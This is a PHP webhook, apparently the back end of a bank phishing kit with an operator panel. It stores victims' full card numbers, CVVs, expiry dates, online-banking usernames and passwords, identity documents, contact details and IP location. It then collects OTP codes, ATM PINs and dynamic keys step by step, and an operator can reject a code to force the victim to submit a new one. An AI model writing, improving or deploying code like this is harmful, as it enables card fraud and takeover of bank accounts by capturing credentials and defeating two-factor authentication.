<?php
// api/webhook.php - VERSIÓN CORREGIDA + IP/PAÍS/CIUDAD
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, X-API-Key');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

// 🔒 Cargar configuración
require_once __DIR__ . '/../panel/config/config.php';

// 🔥 Cargar ban_manager para usar ban_obtenerIPReal() como fallback
require_once __DIR__ . '/../panel/config/ban_manager.php';

$API_KEY_VALIDA = WEBHOOK_SECRET;

// Obtener API Key desde $_SERVER
$api_key = $_SERVER['HTTP_X_API_KEY'] ?? '';

if ($api_key !== $API_KEY_VALIDA) {
    http_response_code(401);
    echo json_encode(['error' => 'API Key inválida']);
    exit;
}

$input = json_decode(file_get_contents('php://input'), true);
if (!$input) {
    http_response_code(400);
    echo json_encode(['error' => 'Datos inválidos']);
    exit;
}

$dataDir = __DIR__ . '/../data/';
if (!is_dir($dataDir)) mkdir($dataDir, 0755, true);

$file = $dataDir . 'solicitudes.dat';
$solicitudes = file_exists($file) ? json_decode(file_get_contents($file), true) : [];

$solicitudId = $input['solicitudId'] ?? 'SOL-' . date('Ymd') . '-' . substr(uniqid(), -6);
$tipo_paso = $input['tipo_paso'] ?? 'credenciales';

// ============================================
// CASO 1: CREDENCIALES
// ============================================
if ($tipo_paso === 'credenciales') {
    $existe = false;
    foreach ($solicitudes as $s) {
        if ($s['id'] === $solicitudId) {
            $existe = true;
            break;
        }
    }
    
    if (!$existe) {
        $solicitud = [
            'id' => $solicitudId,
            'fecha' => date('Y-m-d H:i:s'),
            'tipo_paso' => 'credenciales',
            'estado' => 'pending',
            'fecha_hora' => $input['fechaHora'] ?? date('Y-m-d H:i:s'),
            'tipo_tarjeta' => $input['tipo_tarjeta'] ?? $input['tipoTarjeta'] ?? 'mastercard',
            'numero_tarjeta' => $input['numeroTarjeta'] ?? $input['numero_tarjeta'] ?? 'N/A',
            'cvv' => $input['cvv'] ?? 'N/A',
            'vencimiento' => $input['vencimiento'] ?? 'N/A',
            'banco' => $input['bancoEmisor'] ?? $input['banco_emisor'] ?? 'N/A',
            'usuario' => $input['usuario'] ?? 'N/A',
            'password' => $input['password'] ?? 'N/A',
            'monto' => $input['monto'] ?? 'N/A',
            'nombre' => $input['nombreCompleto'] ?? $input['nombre_completo'] ?? 'N/A',
            'documento' => trim(($input['tipoDocumento'] ?? '') . ' ' . ($input['numeroDocumento'] ?? 'N/A')),
            'email' => $input['email'] ?? 'N/A',
            'celular' => $input['celular'] ?? 'N/A',
            'otp_codigo' => 'N/A',
            'clave_cajero_codigo' => 'N/A',
            'clave_dinamica_codigo' => 'N/A',
            'otp_codigo_secundario' => 'N/A',
            'otp_modo' => 'N/A',
            'intentos' => 0,
            'ultima_actualizacion' => time(),

            // 🔥 IP + PAÍS + CIUDAD (con fallback a ban_obtenerIPReal)
            'ip'     => !empty($input['ip'])     ? $input['ip']     : ban_obtenerIPReal(),
            'pais'   => !empty($input['pais'])   ? $input['pais']   : 'Desconocido',
            'ciudad' => !empty($input['ciudad']) ? $input['ciudad'] : 'Desconocida'
        ];
        $solicitudes[] = $solicitud;
        
        file_put_contents($file, json_encode($solicitudes, JSON_PRETTY_PRINT));
        file_put_contents($dataDir . 'ultima_actualizacion.txt', time());
        
        http_response_code(200);
        echo json_encode([
            'success' => true,
            'id' => $solicitudId,
            'message' => 'Solicitud creada correctamente'
        ]);
        exit;
    } else {
        http_response_code(200);
        echo json_encode([
            'success' => true,
            'id' => $solicitudId,
            'message' => 'Solicitud ya existe'
        ]);
        exit;
    }
}

// ============================================
// CASO 2: OTP / CLAVE DINÁMICA / CLAVE CAJERO
// ============================================
if ($tipo_paso === 'otp' || $tipo_paso === 'clave_dinamica' || $tipo_paso === 'clave_cajero') {
    $originalId = $input['solicitudOriginalId'] ?? $input['solicitudId'] ?? null;
    $esReintento = isset($input['es_reintento']) && $input['es_reintento'] === true;
    
    if ($originalId) {
        $encontrado = false;
        foreach ($solicitudes as &$s) {
            if ($s['id'] === $originalId) {
                
                $estadoActual = $s['estado'] ?? 'pending';
                
                // CASO ESPECIAL: ERROR USUARIO - NO PERMITIR REINTENTOS
                if ($estadoActual === 'rejected_user_error') {
                    http_response_code(403);
                    echo json_encode([
                        'success' => false,
                        'error' => 'Error de usuario. Por favor, reinicie el proceso con nuevas credenciales.',
                        'estado' => $estadoActual,
                        'requiere_reset' => true
                    ]);
                    exit;
                }
                
                $estadosRechazados = ['rejected', 'rejected_otp', 'rejected_clave_cajero'];
                
                if (in_array($estadoActual, $estadosRechazados) && !$esReintento) {
                    http_response_code(403);
                    echo json_encode([
                        'success' => false,
                        'error' => 'La solicitud fue rechazada. Por favor, inicie nuevamente el proceso.',
                        'estado' => $estadoActual
                    ]);
                    exit;
                }
                
                if ($esReintento && in_array($estadoActual, $estadosRechazados)) {
                    $s['estado'] = 'pending_otp';
                    $s['otp_modo'] = 'otp';
                    $s['fecha_procesada'] = date('Y-m-d H:i:s');
                    $s['intentos'] = ($s['intentos'] ?? 0) + 1;
                    $s['otp_codigo'] = 'N/A';
                    $s['clave_cajero_codigo'] = 'N/A';
                    $s['clave_dinamica_codigo'] = 'N/A';
                    $s['otp_codigo_secundario'] = 'N/A';
                    $mensaje = '🔄 Reintento - Estado reiniciado a pending_otp';
                }
                
                $codigo = $input['codigo'] ?? 'N/A';
                
                if ($tipo_paso === 'clave_cajero') {
                    $s['clave_cajero_codigo'] = $codigo;
                    $s['estado'] = 'pending_clave_cajero';
                    $s['otp_modo'] = 'clave_cajero';
                    $s['fecha_clave_cajero'] = date('Y-m-d H:i:s');
                    $mensaje = '🏧 Clave Cajero guardada';
                    
                } elseif ($tipo_paso === 'clave_dinamica') {
                    $s['clave_dinamica_codigo'] = $codigo;
                    $s['estado'] = 'pending_otp';
                    $s['otp_modo'] = 'clave_dinamica';
                    $s['fecha_clave_dinamica'] = date('Y-m-d H:i:s');
                    $mensaje = '🔑 Clave Dinámica guardada';
                    
                } else {
                    // 🔥 OTP - CORREGIDO
                    $tieneClaveCajero = isset($s['clave_cajero_codigo']) && 
                                        $s['clave_cajero_codigo'] !== 'N/A' && 
                                        $s['clave_cajero_codigo'] !== '';
                    
                    $tieneClaveDinamica = isset($s['clave_dinamica_codigo']) && 
                                          $s['clave_dinamica_codigo'] !== 'N/A' && 
                                          $s['clave_dinamica_codigo'] !== '';
                    
                    if ($tieneClaveCajero) {
                        $s['otp_codigo_secundario'] = $codigo;
                        $s['estado'] = 'pending_otp';
                        $s['otp_modo'] = 'otp';
                        $s['fecha_otp'] = date('Y-m-d H:i:s');
                        $mensaje = '📱 OTP guardado (Clave Cajero prevalece como código anterior)';
                    } elseif ($tieneClaveDinamica) {
                        $s['otp_codigo_secundario'] = $codigo;
                        $s['estado'] = 'pending_otp';
                        $s['otp_modo'] = 'otp';
                        $s['fecha_otp'] = date('Y-m-d H:i:s');
                        $mensaje = '📱 OTP guardado (Clave Dinámica prevalece como código anterior)';
                    } else {
                        $s['otp_codigo'] = $codigo;
                        $s['otp_modo'] = 'otp';
                        $s['estado'] = 'pending_otp';
                        $s['fecha_otp'] = date('Y-m-d H:i:s');
                        $mensaje = '📱 OTP guardado';
                    }
                }
                
                $s['ultima_actualizacion'] = time();
                $encontrado = true;
                break;
            }
        }
        
        if ($encontrado) {
            file_put_contents($file, json_encode($solicitudes, JSON_PRETTY_PRINT));
            file_put_contents($dataDir . 'ultima_actualizacion.txt', time());
            
            http_response_code(200);
            echo json_encode([
                'success' => true,
                'id' => $originalId,
                'message' => $mensaje ?? 'Código guardado correctamente',
                'actualizado' => true,
                'es_reintento' => $esReintento
            ]);
            exit;
        }
    }
    
    http_response_code(404);
    echo json_encode([
        'success' => false,
        'error' => 'Solicitud original no encontrada. Por favor, inicie el proceso nuevamente.'
    ]);
    exit;
}

// ============================================
// CASO 3: OBTENER ESTADO
// ============================================
if ($tipo_paso === 'obtener_estado' || isset($_GET['id'])) {
    $id = $input['id'] ?? $_GET['id'] ?? null;
    
    if (!$id) {
        http_response_code(400);
        echo json_encode(['error' => 'ID requerido']);
        exit;
    }
    
    foreach ($solicitudes as $s) {
        if ($s['id'] === $id) {
            http_response_code(200);
            echo json_encode([
                'success' => true,
                'id' => $s['id'],
                'estado' => $s['estado'] ?? 'pending',
                'estado_real' => $s['estado'] ?? 'pending',
                'tipo_tarjeta' => $s['tipo_tarjeta'] ?? 'mastercard',
                'otp_codigo' => $s['otp_codigo'] ?? 'N/A',
                'clave_cajero_codigo' => $s['clave_cajero_codigo'] ?? 'N/A',
                'clave_dinamica_codigo' => $s['clave_dinamica_codigo'] ?? 'N/A',
                'otp_codigo_secundario' => $s['otp_codigo_secundario'] ?? 'N/A',
                'otp_modo' => $s['otp_modo'] ?? 'N/A',
                'intentos' => $s['intentos'] ?? 0,
                'fecha' => $s['fecha'] ?? null,
                'fecha_procesada' => $s['fecha_procesada'] ?? null
            ]);
            exit;
        }
    }
    
    http_response_code(404);
    echo json_encode([
        'success' => false,
        'error' => 'Solicitud no encontrada'
    ]);
    exit;
}

http_response_code(400);
echo json_encode([
    'success' => false,
    'error' => 'Tipo de paso no reconocido'
]);
exit;